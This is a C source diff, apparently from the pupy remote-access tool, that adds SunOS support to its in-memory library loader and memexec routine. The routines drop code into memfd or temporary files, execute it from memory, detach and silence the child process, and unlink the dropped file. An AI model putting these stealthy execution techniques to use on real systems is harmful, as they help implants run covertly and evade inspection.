@@ -20,7 +20,9 @@
 #include "tmplibrary.h"
 #include "debug.h"
 
+#ifdef Linux
 #include "memfd.h"
+#endif
 
 #include "decompress.h"
 
@@ -37,7 +39,9 @@ extern char **environ;
 static inline
 const char *gettemptpl() {
     static const char *templates[] = {
+#ifdef Linux
         "/dev/shm/XXXXXX",
+#endif
         "/tmp/XXXXXX",
         "/var/tmp/XXXXXX",
         NULL
@@ -58,7 +62,11 @@ const char *gettemptpl() {
                         NULL,
                         page_size,
                         PROT_READ|PROT_EXEC,
+#ifdef Linux
                         MAP_PRIVATE|MAP_DENYWRITE,
+#else
+                        MAP_PRIVATE,
+#endif
                         fd,
                         0
                     );
@@ -109,8 +117,19 @@ bool search_library(void *pState, void *pData) {
 }
 
 int drop_library(char *path, size_t path_size, const char *buffer, size_t size) {
+#if defined(Linux)
     int fd = pupy_memfd_create(path, path_size);
     bool memfd = true;
+#elif defined(SunOS)
+    char tmp[PATH_MAX] = {};
+    snprintf(tmp, sizeof(tmp), "/tmp/%s", path);
+    int fd = open(tmp, O_CREAT | O_RDWR, 0600);
+    strncpy(path, tmp, path_size);
+    bool memfd = false;
+#else
+    int fd = -1;
+    bool memfd = false;
+#endif
 
     if (fd < 0) {
         dprint("pupy_memfd_create() failed: %m\n");
@@ -152,9 +171,11 @@ int drop_library(char *path, size_t path_size, const char *buffer, size_t size) 
         }
     }
 
+#ifdef Linux
     if (memfd) {
         fcntl(fd, F_ADD_SEALS, F_SEAL_SEAL | F_SEAL_SHRINK | F_SEAL_GROW | F_SEAL_WRITE);
     }
+#endif
 
     return fd;
 }
@@ -224,12 +245,26 @@ pid_t memexec(const char *buffer, size_t size, const char* const* argv, int stdi
                 dup2(p_stdin[0], 0);  close(p_stdin[1]);
                 dup2(p_stdout[1], 1); close(p_stdout[0]);
                 dup2(p_stderr[1], 2); close(p_stderr[0]);
+            } else {
+                int i;
+
+                if (setsid ( ) == -1)
+                    return -1;
+
+                for (i = 0; i < sysconf(_SC_OPEN_MAX); i++)
+                    close (i);
+
+                open ("/dev/null", O_RDWR);
+                dup (0);
+                dup (0);
             }
 
             close(p_wait[0]);
             set_cloexec_flag(p_wait[1]);
 
+#ifdef Linux
             fexecve(fd, (char *const *) argv, environ);
+#endif
             execv(buffer, (char *const *) argv);
 
             int status = errno;
@@ -279,10 +314,15 @@ pid_t memexec(const char *buffer, size_t size, const char* const* argv, int stdi
     close(p_wait[0]);
     close(fd);
 
+ #ifdef Linux
     if (!is_memfd_path(buf)) {
         sleep(1);
         unlink(buf);
     }
+#else
+    sleep(1);
+    unlink(buf);
+#endif
 
     return child_pid;
 
@@ -338,7 +378,7 @@ void *memdlopen(const char *soname, const char *buffer, size_t size) {
 
     char buf[PATH_MAX]={};
 
-#ifdef DEBUG
+#if defined(DEBUG) || defined(SunOS)
 	if (soname)
 		strncpy(buf, soname, sizeof(buf)-1);
 #endif
@@ -350,8 +390,8 @@ void *memdlopen(const char *soname, const char *buffer, size_t size) {
         return NULL;
     }
 
+#ifdef Linux
     bool is_memfd = is_memfd_path(buf);
-
     dprint("Library \"%s\" dropped to \"%s\" (memfd=%d) \n", soname, buf, is_memfd);
 
 #ifndef NO_MEMFD_DLOPEN_WORKAROUND
@@ -373,6 +413,10 @@ void *memdlopen(const char *soname, const char *buffer, size_t size) {
 			dprint("symlink error %s -> %s: %m\n", buf, fake_path);
 		}
 	}
+#endif
+
+#else
+    bool is_memfd = false;
 #endif
 
     base = dlopen(buf, RTLD_NOW | RTLD_GLOBAL);
